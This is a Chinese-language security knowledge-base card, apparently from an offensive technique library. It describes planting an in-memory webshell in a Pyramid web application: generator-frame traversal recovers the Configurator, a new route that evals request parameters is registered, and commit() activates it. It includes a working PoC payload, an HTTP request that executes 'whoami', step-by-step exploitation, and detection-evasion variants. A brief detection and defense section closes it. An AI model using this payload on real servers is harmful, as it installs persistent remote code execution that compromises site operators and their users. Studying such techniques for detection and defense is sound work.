---
id: web-python-framework-pyramid-runtime-route-memshell-commit
title: Pyramid 运行时路由内存马：栈帧回溯取 Configurator，add_route/add_view 后必须 commit 才生效
type: scenario
domain: web
path: web/python/framework
technique: pyramid-runtime-route-registration-memshell
tags:
- python
- pyramid
- memshell
- route-registration
- configurator
- frame-introspection
- rce
- eval
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:47:30+08:00'
  notes: 已对照原文核对：Pyramid 主程序 add_route/add_view→make_wsgi_app 的构建顺序（img/04）、Configurator dir() 含 add_route/add_view/commit（img/05）、官方 commit() 文档截图文案（img/07）、gi_frame.f_back.f_globals 取模块 globals（img/06）、/shellb?code=... 回显 小新/86150（img/08）均一致。未验证点：'Pyramid 1.8+ 才稳定支持构建后再 commit' 与 'make_wsgi_app 会执行一次 commit' 属推断，原文未说明，未实测；原文未声明 Pyramid 版本，故未写 affected_versions。
url: /docs/web/python/framework/web-python-framework-pyramid-runtime-route-memshell-commit/
draft: false
kb_aliases:
- Pyramid 内存马
- Pyramid add_route 内存马
- Configurator.commit 生效
- make_wsgi_app 后加路由
- gi_frame 取模块 globals
---

## 一句话结论

Pyramid 应用里，`config.make_wsgi_app()` 一旦执行，路由就已被构建；此后用注入点拿到的 `Configurator` 实例调用 `add_route`/`add_view` 只会堆积为 pending action，必须再调 `config.commit()` 才会被真正应用（否则新路径一直 404）；由于注入代码（如 `eval`/`exec` 视图）作用域里通常只有 `request`，需要先用生成器 `gi_frame.f_back` 回溯到视图函数的模块帧、从 `f_globals` 取回模块级的 `config`，再 `add_route` + `add_view` + `commit`，即可注册一条指向 `eval` 的新路由，形成不落盘、进程内持久的路由型内存马。

## 原理

- **配置与应用的分离**：Pyramid 的 `Configurator` 是"待办动作队列"，`add_route(name, path)`/`add_view(view, route_name=...)`/`add_subscriber` 等只是把动作放进 pending 列表；`make_wsgi_app()` 会执行一次 commit 并产出 WSGI app，此后 app 的 router 已定型。原文现象正是：在 `system_test` 里 `config.add_route('shellb','/shellb'); config.add_view(hello, route_name='shellb')` 之后访问 `/shellb` 仍是 404。
- **为什么 commit 能救回来**：官方文档对 `Configurator.commit()` 的描述是"提交任何待处理的配置操作，若检测到冲突则抛 `ConfigurationConflictError`"；它对**已经 make 过的 app** 同样有效——commit 会把新动作应用到已有 registry（route/view 的映射表是同一个 registry 对象），因此新路由立刻可被现有 app 的路由器解析。这也是本手法与 Flask `_got_first_request` 绕过「注册期保护」的差别：Flask 是拒绝再注册，Pyramid 是注册了但不生效。
- **配置对象只能从外层取**：视图函数签名是 `system_test(request)`，注入代码（`request.params['code']` 直接进 `exec`）的局部作用域里没有 `config`；而 `config` 是在 `if __name__ == '__main__': with Configurator() as config:` 处定义的**模块级变量**，因此它存在于该模块的 `__dict__`（`f_globals`）中。
- **为什么用生成器取帧**：在函数内直接 `sys._getframe()` 需要 import；用 `g = (yield 自己的帧)` 的生成器写法，`g.gi_frame` 是生成器自身帧，`next(g)` 让生成器真正运行起来（CPython 才会把 `f_back` 接到驱动它的帧），此时 `gi_frame.f_back` 是视图函数的帧，`f_back.f_back` 是 WSGI 调用链上一层……原文最终用 `frame.f_back.f_back.f_globals` 拿到模块 globals 并 `print` 出来，确认其中可读到需要的内置名/模块级对象。
- **注册后的利用**：新 view 里 `request.params['code']` → `eval(code)` → `Response(res)`，即把所有 Python 执行能力封成一条 GET 路由；该路由与正常路由同权，不经 `@view_config` 也不产生任何文件，重启即消失。

## 触发条件

- 目标为 Pyramid 应用（`pyramid.config.Configurator`），且存在把用户输入交给 `eval`/`exec` 的视图（原文 `system_test` 中 `print(exec(code))`）；
- 攻击者已能通过该执行点运行任意 Python（原文还要求先伪造 admin token 才能进该视图，见关联卡）；
- 注入点所在线程能进行帧回溯（纯 Python 环境，无 restricted/沙箱限制），且模块 globals 里能取到 `Configurator`（通常因 `config` 是模块级变量）；
- 目标未在 `commit` 之后禁止再配置；能访问新增路径。

## 利用步骤

1. 先用最小 payload 验证帧回溯与 globals 可读：`g = f(); frame = next(g); print(frame.f_back.f_back.f_globals)`。
2. 从 globals 里取到 `Configurator` 实例（模块级变量名可能与示例不同，先打印 keys 确认）。
3. 定义恶意 view 并在同一 payload 中完成注册：
   ```python
   def hello(request):
       res = eval(request.params['code'])
       return Response(res)
   cfg.add_route('shellb', '/shellb')
   cfg.add_view(hello, route_name='shellb')
   cfg.commit()          # 关键：不 commit 则 404
   ```
4. 访问 `/shellb?code=<表达式>`，确认回显（原文用 `__import__('os').popen('whoami').read()`）。
5. 若 `commit()` 抛 `ConfigurationConflictError`，改名/改路径重试；若目标在 `make_wsgi_app()` 前就禁用了后续 commit（自定义 tween/拦截），改注册进 `add_subscriber`/`add_tween` 等其它 registry 分支。

## PoC

```python
# 注入到 exec 的 code（原文经 GET /api/test?code=...&token=... 提交）
def waff():
    def f():
        yield g.gi_frame.f_back
    g = f()
    frame = next(g)
    globals_ = frame.f_back.f_back.f_globals      # 模块级 globals，含 config

def hello(request):
    code = request.params['code']
    res = eval(code)
    return Response(res)

config.add_route('shellb', '/shellb')
config.add_view(hello, route_name='shellb')
config.commit()

waff()
```

```http
GET /shellb?code=__import__('os').popen('whoami').read() HTTP/1.1
Host: <target>
```

（原文回显 `小新/86150`，证明命令执行成功。注意 `globals_` 只是验证用，实际 payload 直接用模块级名字 `config`/`Response`——它们在视图函数的 `f_globals` 里可见。）

## 变体与关联

- 变体：不新建 route，直接 `config.add_view(hook, context=..., renderer=...)` 覆盖已有 view 的渲染器，或在既有 route 上挂新 view（`add_view(..., route_name='已存在路由')`），路由表看似不变而行为被替换。
- 变体：把 pending 动作写进 `add_tween`/`add_subscriber`/`add_request_method`，在请求生命周期的其它阶段触发，绕开只盯路由表的检测。
- 变体：栈帧回溯换成 `sys._getframe()`、`inspect.currentframe()`、异常 traceback 的 `tb_frame`，或直接 `__import__('__main__').config`（`__main__` 模块 globals 与帧 globals 同一份）。
- 关联：[[web-generic-token-client-supplied-public-key-forgery]]（进 `system_test` 所需的 admin token 伪造，本卡的前置条件）。
- 关联：[[binary-pwn-sandbox-escape-python-generator-frame-builtins-recovery]]（同一 `gi_frame.f_back` 取帧机制，那张用于沙箱内找回 builtins，本卡用于取框架配置对象）。
- 关联：[[web-python-framework-flask-route-registration-memshell]]（Flask 侧的路由内存马；差异是 Flask 需绕过 `@setupmethod` 检查，Pyramid 需补 `commit()`）。
- 边界：`commit()` 在 Pyramid 1.8+ 才稳定支持"应用构建后再配置"的语义；更老版本或自定义 registry 可能不生效；`config` 若非模块级（例如被封装进闭包/工厂函数）则 globals 里取不到，需要沿帧继续向上找。

## 检测与防御

- 检测：审计 `eval`/`exec` 视图；运行时监控 `Configurator` 的 `commit()` 调用（正常只在启动期发生，请求期出现即为异常）；枚举 `pyramid` registry 中的 route/view 与启动期基线对比，发现新增路由或 view 覆盖。
- 防御：删除把用户输入交给 `eval`/`exec` 的代码；启动完成后把 `config` 从模块作用域移除/置 None，或封装在不可达的闭包中；启用 `pyramid.config` 的 conflict 检测与视图白名单；对进程做 RASP/内存马巡检，重启即清。
